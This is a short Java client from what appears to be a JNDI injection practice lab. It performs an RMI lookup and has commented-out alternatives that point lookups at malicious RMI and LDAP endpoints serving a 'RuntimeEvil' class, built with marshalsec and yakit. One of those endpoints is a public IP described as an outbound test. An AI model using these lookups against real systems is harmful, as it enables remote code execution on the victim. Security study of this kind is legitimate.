package org.example;

import javax.naming.InitialContext;

public class JDNIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
//        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("rmi://127.0.0.1:1099/#JNDI_RuntimeEvil");//marshalsec rmi
        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("rmi://127.0.0.1:1099/remoteImpl");//need diy server
//        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("ldap://127.0.0.1:1099/#JNDI_RuntimeEvil");//need ldap server
//        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("ldap://172.21.240.1:8599/RuntimeEvil");//yakit
//        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("ldap://115.236.153.174:20172/aIWNwcOz");//yakit 直接外联测试
        remoteObject.sayHello("JNDI");
    }
}
